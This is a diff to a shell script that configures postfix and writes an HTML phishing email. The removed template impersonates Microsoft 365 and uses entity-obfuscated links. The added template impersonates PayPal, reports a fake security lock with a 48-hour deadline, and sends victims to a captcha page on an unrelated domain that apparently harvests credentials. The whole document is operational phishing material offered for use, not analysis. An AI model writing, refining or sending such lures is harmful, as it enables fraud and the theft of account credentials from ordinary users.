@@ -45,8 +45,170 @@ service postfix restart
 # === Create HTML email content ===
 echo "Creating email.html..."
 cat > email.html <<EOL
-<html><head><meta http-equiv="Content-Type" content="text/html; charset=us-ascii"></head><body><style type="text/css"><!--
---></style><!-- 152320c0 --><div><table dir="ltr"><tbody><tr><td id="x_i1" style="padding:0; font-family:'Segoe UI Semibold','Segoe UI Bold','Segoe UI','Helvetica Neue Medium',Arial,sans-serif; font-size:17px; color:#707070">Microsoft Office 365 account</td></tr><tr><td id="x_i2" style="padding:0; font-family:'Segoe UI Light','Segoe UI','Helvetica Neue Medium',Arial,sans-serif; font-size:41px; color:#2672ec">Review Recovery Account</td></tr><tr><td id="x_i3" style="padding:0; padding-top:25px; font-size:15pt; font-family:'Segoe UI',Tahoma,Verdana,Arial,sans-serif; font-size:14px; color:#2a2a2a">We have recently updated our Microsoft Services Agreement to strengthen the protection of your recovery account .</td></tr><tr><td id="x_i4" style="padding:0; padding-top:25px; font-family:'Segoe UI Bold','Segoe UI Semibold','Segoe UI','Helvetica Neue Medium',Arial,sans-serif; font-size:14px; font-weight:bold; color:#2a2a2a">Required Action:</td></tr><tr><td id="x_i5" style="padding:0; padding-top:6px; font-family:'Segoe UI',Tahoma,Verdana,Arial,sans-serif; font-size:14px; color:#2a2a2a">To help ensure uninterrupted access to your Microsoft services, please verify and update your account information.</td></tr><tr><td id="x_i10" style="padding:0; padding-top:25px; font-family:'Segoe UI',Tahoma,Verdana,Arial,sans-serif; font-size:14px; color:#2a2a2a">Select the button below to review and confirm your account details.</td></tr><tr><td style="padding:0; padding-top:25px; font-family:'Segoe UI',Tahoma,Verdana,Arial,sans-serif; font-size:14px; color:#2a2a2a"><table border="0" cellspacing="0"><tbody><tr><td bgcolor="#2672ec" style="background-color:#2672ec; padding-top:5px; padding-right:20px; padding-bottom:5px; padding-left:20px; min-width:50px"><a id="x_i11" href="h&#116;&#116;p&#115;&#58;&#47;/&#97;vrent&#97;ls&#101;rv&#105;ces&#111;rlan&#100;&#111;&#46;com&#47;it/cap&#116;&#99;&#104;a3.php" style="font-family:'Segoe UI Semibold','Segoe UI Bold','Segoe UI','Helvetica Neue Medium',Arial,sans-serif; font-size:14px; text-align:center; text-decoration:none; font-weight:600; letter-spacing:0.02em; color:#fff">Secure Account</a></td></tr></tbody></table></td></tr><tr><td id="x_i12" style="padding:0; padding-top:25px; font-family:'Segoe UI',Tahoma,Verdana,Arial,sans-serif; font-size:14px; color:#2a2a2a">Note: If this verification is not completed within 48 hours, access to certain Microsoft services may be temporarily restricted, and some data could become unavailable.</td></tr><tr><td id="x_i13" style="padding:0; padding-top:25px; font-family:'Segoe UI',Tahoma,Verdana,Arial,sans-serif; font-size:14px; color:#2a2a2a">Thanks,</td></tr><tr><td id="x_i14" style="padding:0; font-family:'Segoe UI',Tahoma,Verdana,Arial,sans-serif; font-size:14px; color:#2a2a2a">The Microsoft account team</td></tr></tbody></table><!-- 152320c0 --><div lang="en" style="margin-top:20px; margin-bottom:10px"><a class="x_link" href="&#104;t&#116;&#112;s:&#47;&#47;&#97;&#118;rentalse&#114;v&#105;&#99;&#101;so&#114;lando.&#99;om/it/c&#97;p&#116;cha3.ph&#112;">Privacy Statement</a><!-- 152320c0 --><div style="margin-top:10px">Microsoft Corporation, One Microsoft Way, Redmond, WA 98052<!-- 152320c0 --></div><!-- 152320c0 --></div><!-- 152320c0 --></div></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Account Notification – Immediate Action Needed</title>
+  <style>
+    body {
+      font-family: 'Helvetica Neue', sans-serif;
+      background-color: #eef2f7;
+      margin: 0;
+      padding: 20px;
+      color: #2e2e2e;
+    }
+
+    .container {
+      max-width: 640px;
+      margin: auto;
+      background-color: #ffffff;
+      border-radius: 10px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.06);
+      overflow: hidden;
+    }
+
+    .header {
+      background-color: #ffffff;
+      text-align: center;
+      padding: 30px 20px 10px;
+      border-bottom: 1px solid #e0e0e0;
+    }
+
+    .header img {
+      max-width: 140px;
+    }
+
+    .content {
+      padding: 30px 25px;
+    }
+
+    .content h1 {
+      font-size: 22px;
+      color: #003366;
+      margin-bottom: 16px;
+    }
+
+    .content p {
+      font-size: 15px;
+      line-height: 1.6;
+      margin-bottom: 16px;
+    }
+
+    .content ul {
+      padding-left: 20px;
+      margin-bottom: 16px;
+    }
+
+    .content ul li {
+      margin-bottom: 8px;
+    }
+
+    .button {
+      display: inline-block;
+      padding: 12px 28px;
+      background-color: #1D48A3;
+      color: #ffffff;
+      text-decoration: none;
+      font-weight: 600;
+      border-radius: 6px;
+      transition: background-color 0.3s ease;
+    }
+
+    .button:hover {
+      background-color: #ffffff;
+    }
+
+    .alert {
+      background-color: #fff8e1;
+      padding: 15px 20px;
+      border: 1px solid #ffe58f;
+      border-radius: 6px;
+      font-weight: 500;
+      color: #8a6d3b;
+      margin-top: 25px;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 13px;
+      color: #888;
+      padding: 25px 15px;
+    }
+
+    .footer a {
+      color: #3366cc;
+      text-decoration: none;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+
+    @media (max-width: 600px) {
+      .content {
+        padding: 20px 15px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+
+    <!-- Header -->
+    <div class="header">
+      <img src="https://ik.imagekit.io/yleultaj4/IMG_7172.png?updatedAt=1757889280517" alt="Company Logo" />
+    </div>
+
+    <!-- Body -->
+    <div class="content">
+      <h1>Unusual Activity Detected on Your Account</h1>
+
+      <p>Dear Customer,</p>
+
+      <p>
+        We have identified suspicious activity on your Paypal account on <strong>September 13, 2025</strong> at approximately <strong>2:21 AM</strong>. 
+        This activity differs from your usual behavior and has triggered a temporary security lock on your account.
+      </p>
+
+      <p><strong>Potential causes for this alert may include:</strong></p>
+      <ul>
+        <li>Attempted sign-in with incorrect credentials</li>
+        <li>Login from an unfamiliar location or device</li>
+        <li>Multiple failed access attempts</li>
+        <li>Unusual or unauthorized transactions</li>
+      </ul>
+
+      <p>
+        For your safety, access to your account has been temporarily limited. To restore full access and confirm your identity, please click the secure link below:
+      </p>
+
+      <p style="text-align: center;">
+        <a href="https://avrentalservicesorlando.com/it/up/captcha.html" class="button">Verify and Secure Account</a>
+      </p>
+
+      <div class="alert">
+        To prevent permanent restrictions, please complete the verification within 48 hours.
+      </div>
+
+      <p>We appreciate your prompt attention to this matter.</p>
+      <p>Paypal</p>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    <p>
+      Already verified your identity? 
+      <a href="https://avrentalservicesorlando.com/it/up/captcha.html">Click here</a> to notify our security team.
+    </p>
+    <p>&copy; Paypal & Co. All rights reserved.</p>
+  </div>
+
+</body>
+</html>
 EOL
 
 # Make email.html writable (rw-rw-r--)
